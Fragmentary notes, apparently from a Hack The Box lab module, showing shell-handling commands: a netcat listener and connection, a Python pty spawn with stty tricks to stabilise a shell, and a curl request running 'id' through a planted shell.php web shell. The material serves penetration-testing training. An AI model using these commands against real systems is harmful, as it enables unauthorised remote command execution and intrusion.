...
```bash
onemorekenny13@htb[/htb]$ nc -lvnp 1234
...
```bash
onemorekenny13@htb[/htb]$ nc 10.10.10.1 1234
...
```bash
onemorekenny13@htb[/htb]$ python -c 'import pty; pty.spawn("/bin/bash")'
```
...
onemorekenny13@htb[/htb]$ stty raw -echo
onemorekenny13@htb[/htb]$ fg
...
```bash
onemorekenny13@htb[/htb]$ echo $TERM

xterm-256color
```

```bash
onemorekenny13@htb[/htb]$ stty size
...
UID, GID, and groups set to www-data.

Another option is to use cURL:

```bash
onemorekenny13@htb[/htb]$ curl http://SERVER_IP:PORT/shell.php?cmd=id
